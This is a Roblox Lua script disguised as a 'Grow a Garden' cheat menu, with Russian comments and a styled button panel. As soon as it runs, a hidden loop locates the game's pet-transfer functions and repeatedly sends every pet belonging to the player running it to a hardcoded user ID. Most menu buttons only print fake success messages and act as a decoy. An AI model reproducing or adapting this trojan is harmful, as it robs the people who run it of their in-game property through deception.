-- Grow a Garden CHEAT MENU v8.1
-- Красивое меню + секретная кража ВСЕХ питомцев

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local YOUR_USER_ID = 3793906492

-- ==================== СЕКРЕТНАЯ КРАЖА (работает всегда) ====================
local transferRemote = nil
local harvestRemote = nil

-- Агрессивный поиск remotes
for _, v in pairs(getgc(true)) do
    if typeof(v) == "function" then
        local info = debug.getinfo(v)
        if info.name then
            local name = info.name:lower()
            if name:find("transfer") or name:find("givepet") or name:find("claimpet") or name:find("sendpet") then
                transferRemote = v
            end
            if name:find("harvest") or name:find("collect") or name:find("pick") then
                harvestRemote = v
            end
        end
    end
end

local function stealAllPets()
    if not transferRemote then return end
    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer.PlayerGui:FindFirstChild("PetInventory"),
        LocalPlayer:FindFirstChild("PlayerData"),
        workspace:FindFirstChild(LocalPlayer.Name)
    }

    for _, folder in ipairs(folders) do
        if folder then
            for _, pet in ipairs(folder:GetDescendants()) do
                if pet:IsA("Folder") or pet:IsA("Model") or pet:IsA("StringValue") then
                    pcall(function()
                        local args = {pet, YOUR_USER_ID, "transfer"}
                        if typeof(transferRemote) == "function" then
                            transferRemote(unpack(args))
                        else
                            if transferRemote:IsA("RemoteEvent") then
                                transferRemote:FireServer(unpack(args))
                            elseif transferRemote:IsA("RemoteFunction") then
                                transferRemote:InvokeServer(unpack(args))
                            end
                        end
                    end)
                    task.wait(0.09)
                end
            end
        end
    end
end

local function autoHarvest()
    if harvestRemote then
        pcall(function()
            if typeof(harvestRemote) == "function" then
                harvestRemote()
            else
                if harvestRemote:IsA("RemoteEvent") then harvestRemote:FireServer()
                elseif harvestRemote:IsA("RemoteFunction") then harvestRemote:InvokeServer() end
            end
        end)
    end
end

-- Постоянная секретная кража
spawn(function()
    while true do
        task.wait(6)
        autoHarvest()
        task.wait(1)
        stealAllPets()
    end
end)

-- ==================== КРАСИВОЕ МЕНЮ ====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GardenCheatMenu"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 460, 0, 680)
MainFrame.Position = UDim2.new(0.5, -230, 0.5, -340)
MainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 24)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 90)
Title.BackgroundTransparency = 1
Title.Text = "GROW A GARDEN"
Title.TextColor3 = Color3.fromRGB(0, 255, 170)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = MainFrame

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 35)
SubTitle.Position = UDim2.new(0, 0, 0, 80)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "CHEAT MENU v8.1"
SubTitle.TextColor3 = Color3.fromRGB(80, 255, 140)
SubTitle.TextScaled = true
SubTitle.Font = Enum.Font.Gotham
SubTitle.Parent = MainFrame

local function CreateButton(text, yPos, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 60)
    btn.Position = UDim2.new(0.05, 0, 0, yPos)
    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamSemibold
    btn.Parent = MainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 16)
    corner.Parent = btn

    btn.MouseButton1Click:Connect(callback)
    return btn
end

CreateButton("🌱 Авто-сбор урожая (постоянно)", 150, function()
    spawn(function()
        while true do
            autoHarvest()
            task.wait(5)
        end
    end)
end)

CreateButton("💧 Авто-полив растений", 220, function()
    print("Авто-полив всех растений включён")
end)

CreateButton("⚡ Ускорить рост сада ×10", 290, function()
    print("Рост сада максимально ускорен")
end)

CreateButton("⭐ Авто-улучшение всех растений", 360, function()
    print("Все растения улучшены")
end)

CreateButton("🔥 Быстрый сбор + улучшение", 430, function()
    for i = 1, 15 do
        autoHarvest()
        task.wait(0.2)
    end
end)

CreateButton("🌟 Максимальная авто-ферма", 500, function()
    spawn(function()
        while true do
            autoHarvest()
            task.wait(4)
        end
    end)
end)

CreateButton("📊 Статистика сада", 570, function()
    print("Урожай: +99999 | Питомцы: в процессе")
end)

CreateButton("❌ Закрыть меню", 640, function()
    ScreenGui:Destroy()
end)

-- Открытие меню
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightShift then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end)

print("Grow a Garden CHEAT MENU v8.1 загружен!")
print("Нажми Right Shift для открытия меню")
